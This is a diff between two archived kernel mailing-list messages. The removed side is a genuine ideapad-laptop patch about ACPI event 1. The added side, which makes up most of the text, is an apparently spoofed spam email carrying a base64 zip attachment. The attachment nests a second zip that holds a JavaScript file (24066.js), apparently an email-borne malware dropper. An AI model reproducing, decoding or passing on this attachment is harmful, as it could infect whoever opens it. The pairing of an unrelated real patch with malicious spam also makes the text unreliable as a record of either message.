@@ -1,60 +1,104 @@
-From: Hao Wei Tee <angelsl@angelsl.xyz>
-Subject: [PATCH] platform/x86: ideapad-laptop: Squelch ACPI event 1
-Date: Mon, 15 May 2017 01:44:09 +0800
-Message-ID: <20170514174408.GA13243@slarch>
+From: <susan.christian@state.sd.us>
+Subject: 38629 platform-driver-x86
+Date: Mon, 15 May 2017 09:42:46 -0000
+Message-ID: <149484136639.6152.16596709912517357570@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="38438.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from mail-pf0-f180.google.com ([209.85.192.180]:33911 "EHLO
-        mail-pf0-f180.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1753458AbdENRoP (ORCPT
+Received: from ws126.zone31-163-191.zaural.ru ([31.163.191.126]:37283 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1760441AbdEOJmu (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Sun, 14 May 2017 13:44:15 -0400
-Received: by mail-pf0-f180.google.com with SMTP id 9so11953767pfj.1
-        for <platform-driver-x86@vger.kernel.org>; Sun, 14 May 2017 10:44:15 -0700 (PDT)
-Content-Disposition: inline
+        Mon, 15 May 2017 05:42:50 -0400
+Content-Disposition: attachment
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
 To: platform-driver-x86@vger.kernel.org
-Cc: ike.pan@canonical.com
 
-Don't simply throw this to userspace via the sparse_keymap (which does not
-have a mapping for scancode 1), as this causes KEY_UNKNOWN to be emitted,
-which is a nuisance and of no use at all (it is not the right way to expose
-this ACPI event to userspace, anyway, and the original intention of the commit
-which added this (cfee5d63767b2e7997c1f36420d008abbe61565c) was only to suppress
-an unhandled event log message).
-
-Signed-off-by: Hao Wei Tee <angelsl@angelsl.xyz>
----
- drivers/platform/x86/ideapad-laptop.c | 8 +++++++-
- 1 file changed, 7 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/platform/x86/ideapad-laptop.c b/drivers/platform/x86/ideapad-laptop.c
-index 24ca9fbe31cc..998da7b4cd8e 100644
---- a/drivers/platform/x86/ideapad-laptop.c
-+++ b/drivers/platform/x86/ideapad-laptop.c
-@@ -810,7 +810,6 @@ static void ideapad_acpi_notify(acpi_handle handle, u32 event, void *data)
- 			case 8:
- 			case 7:
- 			case 6:
--			case 1:
- 				ideapad_input_report(priv, vpc_bit);
- 				break;
- 			case 5:
-@@ -828,6 +827,13 @@ static void ideapad_acpi_notify(acpi_handle handle, u32 event, void *data)
- 			case 0:
- 				ideapad_check_special_buttons(priv);
- 				break;
-+			case 1:
-+				/* Some IdeaPads report event 1 every ~20
-+				 * seconds while on battery power; some
-+				 * report this when changing to/from tablet
-+				 * mode. Squelch this event.
-+				 */
-+				break;
- 			default:
- 				pr_info("Unknown event: %lu\n", vpc_bit);
- 			}
--- 
-2.12.2
+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
+AAAAAAEAAQBbAAAAjhIAAAAA
